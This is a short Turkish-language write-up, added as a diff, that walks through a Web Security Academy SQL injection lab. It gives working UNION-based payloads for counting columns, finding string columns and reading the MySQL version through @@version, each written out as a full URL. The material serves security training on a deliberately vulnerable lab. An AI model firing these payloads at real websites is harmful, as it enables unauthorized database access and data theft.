@@ -1,0 +1,13 @@
+LAB: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+1 - Herhangi bir kategori seçiyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Lifestyle
+
+2 - ' ORDER BY 1# payloadı ile sütun sayısını buluyoruz.
+https://<YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories' order by 2#
+
+3 - '+UNION+SELECT+'abc','def'# payloadı ile 2 sütununda string türünde olduğunu anlıyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+%27abc%27,%27def%27#
+
+4 - '+UNION+SELECT+@@version,+NULL# payloadı ile veritabanı versiyonuna ulaşıyoruz.
+https://<YOUR-LAB-ID>.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+@@version,+NULL#
